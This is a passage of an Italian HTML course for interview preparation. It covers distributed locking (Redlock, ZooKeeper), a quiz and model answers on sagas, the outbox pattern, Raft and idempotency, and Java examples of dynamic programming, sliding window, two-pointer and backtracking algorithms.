} else {
    log.info("Another instance is running the job");
}</code></pre>

                <h3>Redlock (Multi-node Redis Lock)</h3>
                <p>Il lock semplice ha problemi se Redis è un single point of failure. <strong>Redlock</strong> (proposto da Redis) usa N nodi Redis indipendenti:</p>

                <div class="diagram"><pre>
REDLOCK ALGORITHM
══════════════════════════════════════════════════════════════

Client vuole acquisire lock:

1. Prende timestamp T1
2. Prova ad acquisire lock su TUTTI gli N nodi Redis (in sequenza)
   Timeout breve per ogni tentativo (es: 5-10ms)
3. Prende timestamp T2
4. Lock acquisito SE:
   - Ottenuto su MAGGIORANZA dei nodi (N/2 + 1)
   - Tempo totale (T2-T1) < TTL del lock

    ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐
    │ Redis 1 │  │ Redis 2 │  │ Redis 3 │  │ Redis 4 │  │ Redis 5 │
    │   ✅    │  │   ✅    │  │   ✅    │  │   ❌    │  │   ❌    │
    └─────────┘  └─────────┘  └─────────┘  └─────────┘  └─────────┘

    3/5 = maggioranza → LOCK ACQUIRED (se tempo < TTL)

5. Per rilasciare: invia unlock a TUTTI i nodi (anche quelli che
   hanno fallito all'acquisizione)

⚠️ CONTROVERSIA: Martin Kleppmann ha criticato Redlock.
   Per lock safety-critical, considera ZooKeeper o etcd
   che hanno garanzie di consensus più forti.
</pre></div>

                <h3>ZooKeeper Distributed Lock</h3>

<pre><code class="language-java">// ZooKeeper lock con ephemeral sequential nodes
// Usa Curator (libreria client high-level)

public class ZookeeperLockExample {

    public void withLock() throws Exception {
        CuratorFramework client = CuratorFrameworkFactory.newClient(
            "zk1:2181,zk2:2181,zk3:2181",
            new ExponentialBackoffRetry(1000, 3)
        );
        client.start();

        InterProcessMutex lock = new InterProcessMutex(
            client,
            "/locks/daily-report"
        );

        // Acquire lock (blocks until acquired)
        if (lock.acquire(30, TimeUnit.SECONDS)) {
            try {
                // Critical section
                runDailyReport();
            } finally {
                lock.release();
            }
        } else {
            throw new IllegalStateException("Could not acquire lock");
        }
    }
}

/*
Come funziona internamente:
1. Client crea ephemeral sequential node:
   /locks/daily-report/lock-0000000001

2. Lista tutti i nodi figli e li ordina

3. Se il mio nodo è il PRIMO → ho il lock!
   Altrimenti → watch sul nodo precedente al mio

4. Quando il nodo precedente viene eliminato (lock rilasciato
   o client crashato) → vengo notificato → ricontrollo

5. Ephemeral nodes vengono eliminati automaticamente se il
   client perde la sessione ZK → no lock zombie!
*/</code></pre>

                <div class="info-box warning">
                    <h4>Fencing Token per Safety</h4>
                    <p>I lock distribuiti hanno un problema: il client potrebbe pensare di avere il lock ma il TTL è scaduto (es: GC pause lunga). Soluzione: <strong>fencing token</strong> - un numero monotonicamente crescente assegnato ad ogni acquisizione. Le risorse protette devono rifiutare operazioni con token vecchi.</p>
                </div>
            </section>

            <!-- Quiz Modulo 17 -->
            <section class="quiz-section" id="modulo17-quiz">
                <h2>Quiz - Modulo 17</h2>

                <div class="quiz-question" data-correct="c">
                    <h4><span>Q81.</span> In una Saga con choreography, un servizio fallisce dopo aver pubblicato il suo evento di successo. Come viene gestito il rollback?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q81" value="a">
                            <span>Il message broker rileva il fallimento e notifica tutti i servizi</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q81" value="b">
                            <span>Il servizio che riceve l'evento successivo trigghera automaticamente il rollback</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q81" value="c">
                            <span>Il servizio fallito deve pubblicare un evento di compensazione che gli altri servizi ascoltano</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q81" value="d">
                            <span>Two-phase commit viene usato automaticamente come fallback</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q81')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q81"></div>
                </div>

                <div class="quiz-question" data-correct="b">
                    <h4><span>Q82.</span> Qual è il vantaggio principale dell'Outbox Pattern rispetto al dual-write (scrivere su DB e Kafka separatamente)?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q82" value="a">
                            <span>Performance migliore perché scrive solo una volta</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q82" value="b">
                            <span>Atomicità: DB write ed evento sono nella stessa transazione, quindi o entrambi o nessuno</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q82" value="c">
                            <span>Non richiede Kafka, funziona con qualsiasi message broker</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q82" value="d">
                            <span>Elimina la necessità di idempotenza nei consumer</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q82')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q82"></div>
                </div>

                <div class="quiz-question" data-correct="a">
                    <h4><span>Q83.</span> Perché un cluster Raft con 5 nodi può tollerare 2 fallimenti ma non 3?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q83" value="a">
                            <span>Serve una maggioranza (quorum) per eleggere un leader: con 2 nodi non c'è maggioranza di 5</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q83" value="b">
                            <span>I log devono essere replicati su almeno 3 nodi per essere considerati committed</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q83" value="c">
                            <span>Raft richiede specificamente N-2 nodi funzionanti</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q83" value="d">
                            <span>I follower devono poter comunicare tra loro, non solo col leader</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q83')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q83"></div>
                </div>

                <div class="quiz-question" data-correct="d">
                    <h4><span>Q84.</span> Hai un consumer Kafka che processa messaggi. Quale strategia garantisce exactly-once processing?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q84" value="a">
                            <span>Usare auto-commit degli offset</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q84" value="b">
                            <span>Committ dell'offset prima del processing</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q84" value="c">
                            <span>Committ dell'offset dopo il processing (at-least-once)</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q84" value="d">
                            <span>At-least-once delivery + processing idempotente con deduplication</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q84')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q84"></div>
                </div>

                <div class="quiz-question" data-correct="c">
                    <h4><span>Q85.</span> Qual è il problema principale di usare un semplice Redis lock con SETNX per operazioni critiche?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q85" value="a">
                            <span>Redis è troppo lento per lock distribuiti</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q85" value="b">
                            <span>SETNX non supporta TTL, quindi i lock possono rimanere per sempre</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q85" value="c">
                            <span>Se il client ha una GC pause lunga, il TTL può scadere mentre pensa ancora di avere il lock</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q85" value="d">
                            <span>Redis non supporta operazioni atomiche</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q85')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q85"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 17 -->
            <section class="section" id="modulo17-questions">
                <h2>Domande da Colloquio - Modulo 17</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra Saga orchestration e choreography.</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Orchestration:</strong> Un orchestrator centrale coordina la saga, invia comandi ai servizi e gestisce le compensazioni. Pro: flusso chiaro, facile debugging. Contro: single point of failure, coupling all'orchestrator. <strong>Choreography:</strong> I servizi reagiscono agli eventi e pubblicano i propri eventi. Nessun coordinatore centrale. Pro: decoupling, scalabile, no SPOF. Contro: flusso difficile da seguire, debugging complesso. Scelta: choreography per saghe semplici (2-3 step), orchestration per saghe complesse o quando serve visibilità centrale.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Cos'è l'Outbox Pattern e quando lo useresti?</h4>
                    <p><strong>Risposta attesa:</strong> L'Outbox Pattern risolve il problema del "dual write": quando devi scrivere su DB E pubblicare un evento, ma non puoi fare entrambi atomicamente. Soluzione: scrivi l'evento in una tabella "outbox" nella STESSA transazione DB del dato principale. Un processo separato (polling o CDC) legge l'outbox e pubblica su Kafka. Garantisce at-least-once: l'evento viene pubblicato se e solo se la transazione DB è committed. Usalo sempre quando devi garantire consistenza tra DB e message broker.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Perché 2PC non è usato nei microservizi moderni?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Blocking:</strong> I partecipanti tengono lock durante la transazione, riducendo throughput. <strong>Single point of failure:</strong> Se il coordinator crasha dopo PREPARE, i partecipanti restano bloccati. <strong>Latency:</strong> Due round-trip di rete. <strong>Not partition tolerant:</strong> Network partition può causare inconsistenza. Alternative: Saga pattern (eventual consistency con compensazioni), TCC (Try-Confirm-Cancel), event sourcing. La maggior parte dei business case non richiede strong consistency tra servizi.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come implementeresti idempotenza in un payment service?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Idempotency key:</strong> Il client invia un UUID unico per ogni richiesta (header Idempotency-Key). Prima di processare, controllo se la key esiste già (Redis con TTL o DB). Se esiste, ritorno lo stesso risultato. Se non esiste, processo e salvo il risultato con la key. <strong>Deduplication:</strong> Per message processing, salvo message ID in una tabella/set e skippo i duplicati. <strong>Natural idempotence:</strong> Preferisco operazioni naturalmente idempotenti (SET invece di INCREMENT quando possibile).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega Raft leader election in termini semplici.</h4>
                    <p><strong>Risposta attesa:</strong> Ogni nodo parte come follower. I follower aspettano heartbeat dal leader. Se non ricevono heartbeat entro un timeout random, diventano candidate e iniziano un'elezione: incrementano il term, votano per sé stessi, chiedono voti agli altri. Se ottengono maggioranza, diventano leader. Il term serve a risolvere conflitti: un nodo con term più alto vince. I timeout random evitano che tutti i nodi diventino candidate contemporaneamente (split vote).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti ZooKeeper vs Redis per distributed locking?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Redis:</strong> Bassa latenza, semplice, già presente in molte architetture. OK per lock "best effort" dove un raro double-acquire non è catastrofico (es: cache refresh). <strong>ZooKeeper:</strong> Garanzie di consensus più forti (basato su Zab, simile a Paxos). Ephemeral nodes eliminano automaticamente lock di client morti. Meglio per operazioni safety-critical dove double-acquire causerebbe data corruption. Trade-off: ZK è più complesso da operare e ha latency maggiore.</p>
                </div>
            </section>

            <!-- Links Modulo 17 -->
            <section class="section" id="modulo17-links">
                <h2>Link di Approfondimento - Modulo 17</h2>

                <div class="info-box">
                    <h4>Saga Pattern</h4>
                    <p><a href="https://microservices.io/patterns/data/saga.html" target="_blank">Microservices.io: Saga Pattern</a> - Riferimento di Chris Richardson</p>
                    <p><a href="https://www.baeldung.com/cs/saga-pattern-microservices" target="_blank">Baeldung: Saga Pattern in Microservices</a></p>
                    <p><a href="https://learn.microsoft.com/en-us/azure/architecture/reference-architectures/saga/saga" target="_blank">Microsoft: Saga distributed transactions</a></p>
                    <p><a href="https://eventuate.io/docs/manual/eventuate-tram/latest/getting-started-eventuate-tram-sagas.html" target="_blank">Eventuate Tram Sagas</a> - Framework per Saga in Java</p>
                </div>

                <div class="info-box">
                    <h4>Outbox Pattern & CDC</h4>
                    <p><a href="https://microservices.io/patterns/data/transactional-outbox.html" target="_blank">Microservices.io: Transactional Outbox</a></p>
                    <p><a href="https://debezium.io/documentation/reference/stable/tutorial.html" target="_blank">Debezium Tutorial</a> - Guida a CDC con Debezium</p>
                    <p><a href="https://www.confluent.io/blog/using-logs-to-build-a-solid-data-infrastructure-or-why-dual-writes-are-a-bad-idea/" target="_blank">Confluent: Why Dual Writes Are Bad</a></p>
                    <p><a href="https://debezium.io/documentation/reference/stable/transformations/outbox-event-router.html" target="_blank">Debezium Outbox Event Router</a></p>
                </div>

                <div class="info-box">
                    <h4>Idempotency & Exactly-Once</h4>
                    <p><a href="https://stripe.com/docs/api/idempotent_requests" target="_blank">Stripe: Idempotent Requests</a> - Best practice da Stripe</p>
                    <p><a href="https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/" target="_blank">Confluent: Exactly-Once in Kafka</a></p>
                    <p><a href="https://www.baeldung.com/kafka-exactly-once" target="_blank">Baeldung: Kafka Exactly-Once Semantics</a></p>
                </div>

                <div class="info-box">
                    <h4>Consensus & Raft</h4>
                    <p><a href="https://raft.github.io/" target="_blank">The Raft Consensus Algorithm</a> - Sito ufficiale con visualizzazione</p>
                    <p><a href="https://raft.github.io/raft.pdf" target="_blank">Raft Paper (PDF)</a> - Paper originale</p>
                    <p><a href="https://thesecretlivesofdata.com/raft/" target="_blank">Raft Visualization</a> - Animazione interattiva di Raft</p>
                    <p><a href="https://etcd.io/docs/v3.5/learning/why/" target="_blank">etcd: Why Raft?</a></p>
                </div>

                <div class="info-box">
                    <h4>Distributed Locking</h4>
                    <p><a href="https://redis.io/docs/manual/patterns/distributed-locks/" target="_blank">Redis: Distributed Locks</a> - Documentazione ufficiale Redlock</p>
                    <p><a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html" target="_blank">Martin Kleppmann: How to do Distributed Locking</a> - Critica a Redlock</p>
                    <p><a href="https://curator.apache.org/docs/recipes/shared-lock" target="_blank">Apache Curator: Shared Lock</a> - ZooKeeper recipes</p>
                    <p><a href="https://www.baeldung.com/java-distributed-lock" target="_blank">Baeldung: Distributed Lock in Java</a></p>
                </div>

                <div class="info-box">
                    <h4>Libri Consigliati</h4>
                    <p><a href="https://dataintensive.net/" target="_blank">Designing Data-Intensive Applications</a> - Martin Kleppmann (must-read!)</p>
                    <p><a href="https://www.oreilly.com/library/view/building-microservices-2nd/9781492034018/" target="_blank">Building Microservices, 2nd Ed</a> - Sam Newman</p>
                </div>
            </section>

            <!-- ==================== MODULO 18: CODING PATTERNS AVANZATI ==================== -->
            <header class="module-header" id="modulo18">
                <span class="module-tag">Modulo 18</span>
                <h1>Coding Patterns Avanzati</h1>
                <p>Pattern algoritmici fondamentali per risolvere problemi di coding interview: Dynamic Programming, Sliding Window, Two Pointers, Backtracking e Binary Search.</p>
            </header>

            <!-- Dynamic Programming -->
            <section class="section" id="modulo18-dp">
                <h2>Dynamic Programming</h2>

                <p>La <strong>Dynamic Programming (DP)</strong> risolve problemi complessi scomponendoli in sottoproblemi sovrapposti, memorizzando i risultati per evitare ricalcoli.</p>

                <h3>Top-Down (Memoization) vs Bottom-Up (Tabulation)</h3>

                <div class="diagram"><pre>
TOP-DOWN (Memoization)                BOTTOM-UP (Tabulation)
═══════════════════════════           ═══════════════════════════

Ricorsione + cache                    Iterazione + array

fib(5)                                dp[0] = 0
├─ fib(4)                             dp[1] = 1
│  ├─ fib(3)                          dp[2] = dp[0] + dp[1] = 1
│  │  ├─ fib(2) → cached!             dp[3] = dp[1] + dp[2] = 2
│  │  └─ fib(1)                       dp[4] = dp[2] + dp[3] = 3
│  └─ fib(2) → cached!                dp[5] = dp[3] + dp[4] = 5
└─ fib(3) → cached!

✅ Intuitivo, segue la                ✅ Nessun overhead di
   ricorsione naturale                   stack ricorsivo
❌ Stack overflow per                 ❌ Calcola TUTTI i
   input molto grandi                    sottoproblemi
❌ Overhead function call
</pre></div>

<pre><code class="language-java">// Fibonacci - Confronto approcci

// 1. Ricorsione naive - O(2^n) tempo, O(n) spazio (stack)
public int fibNaive(int n) {
    if (n <= 1) return n;
    return fibNaive(n - 1) + fibNaive(n - 2);  // Ricalcola tutto!
}

// 2. Top-Down con Memoization - O(n) tempo, O(n) spazio
public int fibMemo(int n, int[] memo) {
    if (n <= 1) return n;
    if (memo[n] != 0) return memo[n];  // Già calcolato!

    memo[n] = fibMemo(n - 1, memo) + fibMemo(n - 2, memo);
    return memo[n];
}

// 3. Bottom-Up con Tabulation - O(n) tempo, O(n) spazio
public int fibTab(int n) {
    if (n <= 1) return n;
    int[] dp = new int[n + 1];
    dp[0] = 0;
    dp[1] = 1;

    for (int i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }
    return dp[n];
}

// 4. Bottom-Up ottimizzato - O(n) tempo, O(1) spazio!
public int fibOptimized(int n) {
    if (n <= 1) return n;
    int prev2 = 0, prev1 = 1;

    for (int i = 2; i <= n; i++) {
        int curr = prev1 + prev2;
        prev2 = prev1;
        prev1 = curr;
    }
    return prev1;
}</code></pre>

                <h3>Climbing Stairs</h3>
                <p>Puoi salire 1 o 2 gradini alla volta. Quanti modi per raggiungere lo step n?</p>

<pre><code class="language-java">// È essenzialmente Fibonacci! dp[n] = dp[n-1] + dp[n-2]
// Dall'ultimo step: arrivi da n-1 (1 step) o da n-2 (2 steps)

public int climbStairs(int n) {
    if (n <= 2) return n;

    int prev2 = 1;  // modi per arrivare a step 1
    int prev1 = 2;  // modi per arrivare a step 2

    for (int i = 3; i <= n; i++) {
        int curr = prev1 + prev2;
        prev2 = prev1;
        prev1 = curr;
    }
    return prev1;
}
// Time: O(n), Space: O(1)</code></pre>

                <h3>Coin Change</h3>
                <p>Dato un insieme di monete, trova il minimo numero di monete per raggiungere un importo.</p>

<pre><code class="language-java">// coins = [1, 2, 5], amount = 11 → Output: 3 (5+5+1)

public int coinChange(int[] coins, int amount) {
    // dp[i] = minimo numero di monete per importo i
    int[] dp = new int[amount + 1];
    Arrays.fill(dp, amount + 1);  // "infinito" (impossibile)
    dp[0] = 0;  // 0 monete per importo 0

    for (int i = 1; i <= amount; i++) {
        for (int coin : coins) {
            if (coin <= i) {
                // Uso questa moneta + minimo per il resto
                dp[i] = Math.min(dp[i], dp[i - coin] + 1);
            }
        }
    }

    return dp[amount] > amount ? -1 : dp[amount];
}
// Time: O(amount * coins), Space: O(amount)

/*
Esempio: coins=[1,2,5], amount=11
dp[0] = 0
dp[1] = dp[0]+1 = 1     (1)
dp[2] = dp[0]+1 = 1     (2)
dp[3] = dp[1]+1 = 2     (2+1)
dp[4] = dp[2]+1 = 2     (2+2)
dp[5] = dp[0]+1 = 1     (5)
dp[6] = dp[5]+1 = 2     (5+1)
...
dp[11] = dp[6]+1 = 3    (5+5+1)
*/</code></pre>

                <h3>Longest Common Subsequence (LCS)</h3>
                <p>Trova la più lunga sottosequenza comune a due stringhe (non necessariamente contigua).</p>

<pre><code class="language-java">// "abcde", "ace" → "ace" (lunghezza 3)

public int longestCommonSubsequence(String text1, String text2) {
    int m = text1.length(), n = text2.length();
    // dp[i][j] = LCS di text1[0..i-1] e text2[0..j-1]
    int[][] dp = new int[m + 1][n + 1];

    for (int i = 1; i <= m; i++) {
        for (int j = 1; j <= n; j++) {
            if (text1.charAt(i - 1) == text2.charAt(j - 1)) {
                // Caratteri uguali: estendi LCS precedente
                dp[i][j] = dp[i - 1][j - 1] + 1;
            } else {
                // Caratteri diversi: prendi il max escludendo uno dei due
                dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]);
            }
        }
    }
    return dp[m][n];
}
// Time: O(m*n), Space: O(m*n) - ottimizzabile a O(min(m,n))</code></pre>

                <h3>0/1 Knapsack</h3>
                <p>Dato uno zaino con capacità W e oggetti con peso/valore, massimizza il valore senza superare la capacità.</p>

<pre><code class="language-java">// weights = [1, 2, 3], values = [6, 10, 12], capacity = 5
// Output: 22 (oggetti con peso 2 e 3)

public int knapsack01(int[] weights, int[] values, int capacity) {
    int n = weights.length;
    // dp[i][w] = max valore usando primi i oggetti con capacità w
    int[][] dp = new int[n + 1][capacity + 1];

    for (int i = 1; i <= n; i++) {
        int weight = weights[i - 1];
        int value = values[i - 1];

        for (int w = 0; w <= capacity; w++) {
            if (weight > w) {
                // Oggetto troppo pesante, non posso prenderlo
                dp[i][w] = dp[i - 1][w];
            } else {
                // Max tra: non prendere vs prendere
                dp[i][w] = Math.max(
                    dp[i - 1][w],                    // Non prendo
                    dp[i - 1][w - weight] + value   // Prendo
                );
            }
        }
    }
    return dp[n][capacity];
}
// Time: O(n * capacity), Space: O(n * capacity)

// Ottimizzazione spazio O(capacity) - itera all'indietro!
public int knapsackOptimized(int[] weights, int[] values, int capacity) {
    int[] dp = new int[capacity + 1];

    for (int i = 0; i < weights.length; i++) {
        // IMPORTANTE: itera all'INDIETRO per non sovrascrivere
        // valori che ti servono ancora
        for (int w = capacity; w >= weights[i]; w--) {
            dp[w] = Math.max(dp[w], dp[w - weights[i]] + values[i]);
        }
    }
    return dp[capacity];
}</code></pre>

                <div class="info-box success">
                    <h4>Quando usare DP?</h4>
                    <p><strong>1. Optimal substructure:</strong> La soluzione ottima contiene soluzioni ottime dei sottoproblemi</p>
                    <p><strong>2. Overlapping subproblems:</strong> Gli stessi sottoproblemi vengono risolti più volte</p>
                    <p><strong>Pattern riconoscibili:</strong> "minimo/massimo", "numero di modi", "è possibile?", "più lungo/corto"</p>
                </div>
            </section>

            <!-- Sliding Window -->
            <section class="section" id="modulo18-slidingwindow">
                <h2>Sliding Window</h2>

                <p>Il pattern <strong>Sliding Window</strong> mantiene una "finestra" di elementi contigui, espandendola o contraendola per trovare sottarray/sottostringa ottimali.</p>

                <h3>Fixed vs Variable Window</h3>

                <div class="diagram"><pre>
FIXED WINDOW                          VARIABLE WINDOW
(dimensione nota)                     (dimensione da trovare)

[1, 2, 3, 4, 5] window=3              [2, 3, 1, 2, 4, 3] target=7
 └─────┘ sum=6                        └──────────┘ sum=6 (troppo poco)
    └─────┘ sum=9                     └─────────────┘ sum=8 (troppo!)
       └─────┘ sum=12                    └───────────┘ sum=7 ✓
                                      (contrai da sinistra)

Espandi: aggiungi arr[right]          Espandi: right++
Contrai: rimuovi arr[left]            Contrai: left++ (quando condizione violata)
Left++ e right++                      Lunghezza variabile
</pre></div>

                <h3>Maximum Subarray Sum (Fixed Window)</h3>

<pre><code class="language-java">// Trova max sum di k elementi consecutivi
// arr = [1, 4, 2, 10, 2, 3, 1, 0, 20], k = 4 → 24 (10+2+3+9? no, 3+1+0+20=24)

public int maxSumFixedWindow(int[] arr, int k) {
    if (arr.length < k) return -1;

    // Calcola somma della prima finestra
    int windowSum = 0;
    for (int i = 0; i < k; i++) {
        windowSum += arr[i];
    }

    int maxSum = windowSum;

    // Scorri la finestra: aggiungi nuovo elemento, rimuovi vecchio
    for (int i = k; i < arr.length; i++) {
        windowSum += arr[i] - arr[i - k];  // Add new, remove old
        maxSum = Math.max(maxSum, windowSum);
    }

    return maxSum;
}
// Time: O(n), Space: O(1)</code></pre>

                <h3>Minimum Size Subarray Sum (Variable Window)</h3>

<pre><code class="language-java">// Trova la lunghezza minima di un subarray con somma >= target
// nums = [2,3,1,2,4,3], target = 7 → Output: 2 ([4,3])

public int minSubArrayLen(int target, int[] nums) {
    int left = 0;
    int sum = 0;
    int minLen = Integer.MAX_VALUE;

    for (int right = 0; right < nums.length; right++) {
        sum += nums[right];  // Espandi finestra

        // Contrai finestra finché la condizione è soddisfatta
        while (sum >= target) {
            minLen = Math.min(minLen, right - left + 1);
            sum -= nums[left];
            left++;  // Contrai
        }
    }

    return minLen == Integer.MAX_VALUE ? 0 : minLen;
}
// Time: O(n), Space: O(1)</code></pre>

                <h3>Longest Substring Without Repeating Characters</h3>

<pre><code class="language-java">// "abcabcbb" → 3 ("abc")
// "bbbbb" → 1 ("b")

public int lengthOfLongestSubstring(String s) {
    Map&lt;Character, Integer&gt; lastSeen = new HashMap&lt;&gt;();
    int maxLen = 0;
    int left = 0;

    for (int right = 0; right < s.length(); right++) {
        char c = s.charAt(right);

        if (lastSeen.containsKey(c) && lastSeen.get(c) >= left) {
            // Carattere duplicato nella finestra corrente
            // Sposta left DOPO l'ultima occorrenza di c
            left = lastSeen.get(c) + 1;
        }

        lastSeen.put(c, right);
        maxLen = Math.max(maxLen, right - left + 1);
    }

    return maxLen;
}
// Time: O(n), Space: O(min(n, alphabet_size))</code></pre>

                <h3>Template Generale</h3>

<pre><code class="language-java">// Template per Variable Sliding Window
public int slidingWindowTemplate(int[] arr) {
    int left = 0;
    int result = 0;
    // Struttura per tracking (sum, count, map, etc.)

    for (int right = 0; right < arr.length; right++) {
        // 1. ESPANDI: aggiungi arr[right] alla finestra
        // update(arr[right])

        // 2. CONTRAI: finché la finestra è invalida
        while (/* window is invalid */) {
            // Rimuovi arr[left] dalla finestra
            // remove(arr[left])
            left++;
        }

        // 3. UPDATE RESULT: la finestra [left, right] è valida
        // result = Math.max(result, right - left + 1);
    }

    return result;
}</code></pre>
            </section>

            <!-- Two Pointers -->
            <section class="section" id="modulo18-twopointers">
                <h2>Two Pointers</h2>

                <p>Il pattern <strong>Two Pointers</strong> usa due indici che si muovono nella struttura dati per ridurre la complessità da O(n²) a O(n).</p>

                <h3>Two Sum (Array Ordinato)</h3>

<pre><code class="language-java">// Trova due numeri che sommano a target in array ORDINATO
// numbers = [2, 7, 11, 15], target = 9 → [0, 1] (indici)

public int[] twoSumSorted(int[] numbers, int target) {
    int left = 0, right = numbers.length - 1;

    while (left < right) {
        int sum = numbers[left] + numbers[right];

        if (sum == target) {
            return new int[]{left, right};
        } else if (sum < target) {
            left++;   // Somma troppo piccola, aumenta
        } else {
            right--;  // Somma troppo grande, diminuisci
        }
    }

    return new int[]{-1, -1};  // Non trovato
}
// Time: O(n), Space: O(1)</code></pre>

                <h3>3Sum</h3>
                <p>Trova tutte le triple che sommano a zero (senza duplicati).</p>

<pre><code class="language-java">// nums = [-1, 0, 1, 2, -1, -4] → [[-1, -1, 2], [-1, 0, 1]]

public List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) {
    List&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;();
    Arrays.sort(nums);  // Prerequisito per two pointers

    for (int i = 0; i < nums.length - 2; i++) {
        // Skip duplicati per il primo elemento
        if (i > 0 && nums[i] == nums[i - 1]) continue;

        // Two Sum con target = -nums[i]
        int left = i + 1, right = nums.length - 1;
        int target = -nums[i];

        while (left < right) {
            int sum = nums[left] + nums[right];

            if (sum == target) {
                result.add(Arrays.asList(nums[i], nums[left], nums[right]));

                // Skip duplicati
                while (left < right && nums[left] == nums[left + 1]) left++;
                while (left < right && nums[right] == nums[right - 1]) right--;

                left++;
                right--;
            } else if (sum < target) {
                left++;
            } else {
                right--;
            }
        }
    }

    return result;
}
// Time: O(n²), Space: O(1) excluding output</code></pre>

                <h3>Container With Most Water</h3>

<pre><code class="language-java">// Trova il container che contiene più acqua
// height = [1,8,6,2,5,4,8,3,7] → 49 (tra indici 1 e 8)

public int maxArea(int[] height) {
    int left = 0, right = height.length - 1;
    int maxWater = 0;

    while (left < right) {
        // Area = min(altezze) * larghezza
        int h = Math.min(height[left], height[right]);
        int w = right - left;
        maxWater = Math.max(maxWater, h * w);

        // Muovi il puntatore con altezza minore
        // (muovere quello maggiore non può migliorare, l'area
        // è limitata dal minore)
        if (height[left] < height[right]) {
            left++;
        } else {
            right--;
        }
    }

    return maxWater;
}
// Time: O(n), Space: O(1)</code></pre>

                <h3>Remove Duplicates In-Place</h3>

<pre><code class="language-java">// Rimuovi duplicati da array ordinato, ritorna nuova lunghezza
// nums = [0,0,1,1,1,2,2,3,3,4] → 5, nums = [0,1,2,3,4,...]

public int removeDuplicates(int[] nums) {
    if (nums.length == 0) return 0;

    int slow = 0;  // Posizione dove scrivere

    for (int fast = 1; fast < nums.length; fast++) {
        if (nums[fast] != nums[slow]) {
            slow++;
            nums[slow] = nums[fast];
        }
    }

    return slow + 1;  // Lunghezza
}
// Time: O(n), Space: O(1)</code></pre>
            </section>

            <!-- Backtracking -->
            <section class="section" id="modulo18-backtracking">
                <h2>Backtracking</h2>

                <p>Il <strong>Backtracking</strong> esplora tutte le possibili soluzioni costruendole incrementalmente e "tornando indietro" quando un ramo non può portare a soluzioni valide.</p>

                <div class="diagram"><pre>
BACKTRACKING TEMPLATE
═══════════════════════════════════════════════════════════════

                         []
              ┌──────────┼──────────┐
              ▼          ▼          ▼
            [1]        [2]        [3]
          ┌──┴──┐    ┌──┴──┐
          ▼     ▼    ▼     ▼
        [1,2] [1,3] [2,3]  ...
          │     │
          ▼     ▼
       [1,2,3] ...

Ad ogni nodo:
1. È una soluzione valida? → Aggiungi al risultato
2. Posso continuare? → Esplora i figli (CHOOSE)
3. Backtrack → Rimuovi l'ultimo elemento (UNCHOOSE)
</pre></div>

                <h3>Permutations</h3>

<pre><code class="language-java">// Genera tutte le permutazioni
// [1,2,3] → [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]

public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) {
    List&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;();
    backtrackPermute(nums, new ArrayList&lt;&gt;(), new boolean[nums.length], result);
    return result;
}

private void backtrackPermute(int[] nums, List&lt;Integer&gt; current,
                              boolean[] used, List&lt;List&lt;Integer&gt;&gt; result) {
    // Base case: permutazione completa
    if (current.size() == nums.length) {
        result.add(new ArrayList&lt;&gt;(current));  // Copia!
        return;
    }

    // Prova ogni numero non ancora usato
    for (int i = 0; i < nums.length; i++) {
        if (used[i]) continue;

        // CHOOSE
        current.add(nums[i]);
        used[i] = true;

